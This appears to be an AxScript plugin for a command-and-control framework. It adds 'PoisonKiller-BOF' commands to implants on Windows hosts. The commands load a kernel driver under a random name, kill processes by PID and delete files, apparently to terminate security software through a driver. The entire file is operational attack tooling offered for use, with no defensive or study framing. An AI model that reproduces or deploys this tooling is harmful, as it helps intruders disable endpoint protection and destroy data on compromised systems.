var metadata = {
    name: "PoisonKiller-BOF",
    description: "Poison Killer BOF"
};

var cmd_pk_load = ax.create_command("pk-load", "Load the driver", "pk-load \"C:\\Temp\\PoisonX.sys\"");

cmd_pk_load.addArgString("path", true, "Full path of the driver file");
cmd_pk_load.addArgString("name", false, "A random driver name to use");

cmd_pk_load.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let driver_path = parsed_json["path"];
    let driver_name = parsed_json["name"] || "";
    ax.console_message(id, "pk-load info message\n", "info", "[*] driver_path: " + driver_path);
    
    if (driver_name == "") {
        driver_name = ax.random_string(8, "alphabetic");
        ax.console_message(id, "pk-load info message\n", "info", "[*] Using random driver_name: " + driver_name);
    }else{
        ax.console_message(id, "pk-load info message\n", "info", "[*] driver_name: " + driver_name);
    }
    
    let bof_params = ax.bof_pack("wstr,wstr",[driver_path,driver_name]);
    
    let bof_path = ax.script_dir() + "_bin/loaddriver.x64.o";
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "Task: Load the driver");
});


var cmd_pk_unload = ax.create_command("pk-unload", "Unload the driver", "pk-unload <name>");

cmd_pk_unload.addArgString("name", true, "The name of the loaded driver to unload");

cmd_pk_unload.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let driver_name = parsed_json["name"];
    ax.console_message(id, "pk-unload info message\n", "info", "[*] driver_name: " + driver_name);

    let bof_params = ax.bof_pack("wstr",[driver_name]);
    
    let bof_path = ax.script_dir() + "_bin/unloaddriver.x64.o";
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "Task: Unload the driver");
});


var cmd_kill_process = ax.create_command("pk-kill", "Kill process by PID", "pk-kill <pid>");

cmd_kill_process.addArgString("pid", true, "The process pid to kill");

cmd_kill_process.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let process_pid = parsed_json["pid"];
    let bof_params = ax.bof_pack("int",[process_pid]);
    
    let bof_path = ax.script_dir() + "_bin/killprocess.x64.o";
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "Task: Kill the process");
});


var cmd_delete_file = ax.create_command("pk-delete", "Delete the file", "pk-delete <path>");

cmd_delete_file.addArgString("path", true, "The full path of the file to be delete");

cmd_delete_file.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let file_path = parsed_json["path"];
    let bof_params = ax.bof_pack("wstr",[file_path]);
    
    let bof_path = ax.script_dir() + "_bin/delete.x64.o";
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "Task: Delete the file");
});


var group_test = ax.create_commands_group("PoisonKiller-BOF", [cmd_pk_load, cmd_pk_unload, cmd_kill_process, cmd_delete_file]);
ax.register_commands_group(group_test, ["beacon", "gopher", "kharon"], ["windows"], []);
